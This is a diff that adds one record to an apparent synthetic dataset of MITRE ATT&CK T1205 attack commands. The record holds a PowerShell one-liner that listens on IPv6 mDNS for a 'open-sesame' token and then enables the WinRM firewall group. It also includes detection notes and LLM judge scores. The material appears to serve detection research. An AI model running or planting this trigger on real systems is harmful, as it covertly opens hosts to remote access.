@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$grp=[System.Net.IPAddress]::Parse('ff02::fb');$u=New-Object System.Net.Sockets.UdpClient([System.Net.Sockets.AddressFamily]::InterNetworkV6);$u.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket,[System.Net.Sockets.SocketOptionName]::ReuseAddress,$true);$u.Client.Bind([System.Net.IPEndPoint]::new([System.Net.IPAddress]::IPv6Any,5353));$u.JoinMulticastGroup($grp);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::IPv6Any,0);while($true){$b=$u.Receive([ref]$ep);$s=[Text.Encoding]::UTF8.GetString($b);if($s -like '*open-sesame*'){& netsh advfirewall firewall set rule group=\"Windows Remote Management\" new enable=yes;break}}",
+  "explanation": "Listens on IPv6 mDNS multicast (ff02::fb, UDP/5353) for a payload containing 'open-sesame'. On match, enables the Windows Remote Management firewall group using netsh, exposing management endpoints only after receipt of a covert multicast signal. Requires elevation.",
+  "rationale_steps": [
+    "Join IPv6 mDNS multicast group and read UDP datagrams for a magic token.",
+    "Enable WinRM firewall group when the token is observed to expose remote management.",
+    "Detection: alert on unexpected UDP/5353 listeners, IPv6 multicast use on servers, and netsh-based enabling of WinRM on systems where it is usually disabled."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-3bddffbc",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, proper separators, and valid .NET method/property usage.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually fits Traffic Signaling by listening on mDNS and triggering an action on a secret string, but IPv6 multicast joining likely fails without specifying an interface index and enabling the firewall requires elevation, reducing practical effectiveness.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:18:13.987064Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with correct syntax for variable assignments, object instantiation, method calls, control flow, and external command execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1205 technique by listening for a specific signal on a multicast address (mDNS) to trigger a security-relevant action (enabling a firewall rule), demonstrating operational plausibility and correct tool usage as described in its explanation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:18:32.417487Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
